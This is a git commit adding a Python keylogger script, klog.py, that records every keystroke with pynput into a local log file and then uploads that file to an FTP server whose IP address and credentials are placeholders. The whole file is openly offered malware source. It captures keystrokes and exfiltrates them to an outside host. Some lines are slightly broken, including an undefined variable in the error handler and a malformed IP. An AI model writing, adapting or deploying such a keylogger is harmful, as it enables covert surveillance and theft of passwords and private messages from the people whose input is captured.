547a472ffcdf7df9e05df05e36852f805d4c1c5c
Jinna <110377417+Jinna8141@users.noreply.github.com>
2024-01-20 17:17:06 +0530

    Add files via upload

---
+++ Keylogger/klog.py
@@ -0,0 +1,35 @@
+from pynput.keyboard import Key,Listener
+import ftplib
+import logging
+
+logdir = ""
+logging.basicConfig(filename=(logdir+"klog-res.txt"),level=logging.DEBUG,format="%(asctime)s:%(message)s")
+
+
+def pressing_key(Key) :
+    try:
+        logging. info (str (Key) )
+    except AttributeError:
+        print("A special key {e} has been pressed. " . format(key))
+
+
+def releasing_key(key) :
+    if key == Key.esc:
+        return False
+
+
+print("\nStarted listening.. .\n")
+
+with Listener(on_press=pressing_key, on_release=releasing_key) as listener:
+    listener. join ( )
+
+
+print("\nConnecting to the FTP and sending the data...")
+
+# Edit FTP server IP address and cerdentials
+sess = ftplib.FTP("192.168.e.e", "username" , "password")
+
+file = open("klog-res.txt", "rb")
+sess.storbinary("STOR klog-res.txt" , file)
+file. close()
+sess.quit()
